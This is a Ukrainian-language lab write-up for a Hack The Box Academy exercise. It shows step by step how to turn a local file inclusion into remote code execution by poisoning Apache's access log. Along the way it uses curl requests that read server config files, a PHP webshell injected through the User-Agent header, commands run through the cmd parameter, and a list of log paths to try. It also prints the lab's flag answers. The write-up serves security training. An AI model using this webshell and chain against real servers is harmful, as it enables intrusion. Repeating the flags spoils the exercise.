## LFI — Log Poisoning: Apache Access Log → RCE

**Модуль:** [File Inclusion](https://academy.hackthebox.com/app/module/23)
**Секція:** [Log Poisoning](https://academy.hackthebox.com/app/module/23/section/252)
**Q1 (pwd):** `/var/www/html`
**Q2 (flag):** `HTB{1095_5#0u1d_n3v3r_63_3xp053d}`

***

## Концепція

Apache записує `User-Agent` заголовок у `access.log` без санітизації. Якщо застосунок може читати цей лог через LFI — підставляємо PHP webshell у `User-Agent` → при включенні лог виконується як PHP → RCE.

***

## Крок 1 — Перевірити читабельність логів

```bash
# access.log
curl -s "http://TARGET_IP:PORT/index.php?language=/var/log/apache2/access.log" | head -20

# Якщо порожньо — шукаємо шлях до логу в конфігу
curl -s "http://TARGET_IP:PORT/index.php?language=/etc/apache2/apache2.conf" | grep -i "ErrorLog\|CustomLog\|LogFormat"
```

У конфізі побачимо:
```
ErrorLog ${APACHE_LOG_DIR}/error.log
```
`APACHE_LOG_DIR` = `/var/log/apache2/` на Ubuntu.

***

## Крок 2 — Визначення ОС (опціонально)

```bash
curl -s "http://TARGET_IP:PORT/index.php?language=/etc/os-release" | grep "NAME\|VERSION"
# NAME="Ubuntu"
# VERSION="20.04.2 LTS (Focal Fossa)"
```

Підтверджує шляхи логів для Ubuntu/Debian.

***

## Крок 3 — Отруєння User-Agent через Burp Repeater

У **Burp Suite → Repeater** відправляємо модифікований запит:

```http
GET /index.php?language=en.php HTTP/1.1
Host: TARGET_IP:PORT
User-Agent: <?php echo system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: keep-alive
```

> `echo system(...)` — `echo` виводить результат у відповідь, `system()` виконує команду.

**Альтернатива через curl:**
```bash
curl -s "http://TARGET_IP:PORT/index.php" \
  --header "User-Agent: <?php echo system(\$_GET['cmd']); ?>"
```

***

## Крок 4 — Верифікація RCE (Q1: pwd)

```bash
# Через browser (view-source)
view-source:http://TARGET_IP:PORT/index.php?language=/var/log/apache2/access.log&cmd=pwd

# Або curl
curl -s "http://TARGET_IP:PORT/index.php?language=/var/log/apache2/access.log&cmd=pwd" \
  | grep -o '/[a-zA-Z/]*html[a-zA-Z/]*'
```

**Q1 відповідь:** `/var/www/html`

***

## Крок 5 — Знайти прапор у `/`

```bash
# Дивимось / через view-source (читабельніше)
view-source:http://TARGET_IP:PORT/index.php?language=/var/log/apache2/access.log&cmd=ls%20-la%20/
```

У виводі знаходимо нестандартний файл:
```
-rw-r--r--. 1 root root 34 Mar 25 2022 c85ee5082f4c723ace6c0796e3a3db09.txt
```

***

## Крок 6 — Читаємо прапор (Q2)

```bash
view-source:http://TARGET_IP:PORT/index.php?language=/var/log/apache2/access.log&cmd=cat%20/c85ee5082f4c723ace6c0796e3a3db09.txt
```

**Q2 відповідь:** `HTB{1095_5#0u1d_n3v3r_63_3xp053d}`

***

## Важливі нюанси

| Деталь | Пояснення |
|---|---|
| `view-source:` у браузері | Зручніше для читання — вивід команди видно у User-Agent рядку логу без HTML-шуму |
| Poison відправляється **окремо** перед кожним `cmd=` | Лог накопичується — після перезавантаження інстансу poison зникає |
| `<?php echo system(...); ?>` vs `<?php system(...); ?>` | `echo` гарантує що вивід потрапить у відповідь |
| Poison через Burp Repeater | Надійніше ніж curl з `--header` — немає проблем з shell escaping |

***

## Де ще шукати логи (якщо `/var/log/apache2/` недоступний)

```bash
/var/log/nginx/access.log      # Nginx
/var/log/httpd/access.log      # CentOS/RHEL Apache
/var/log/auth.log              # SSH логи
/var/log/vsftpd.log            # FTP
/proc/self/environ             # Env змінні процесу
```
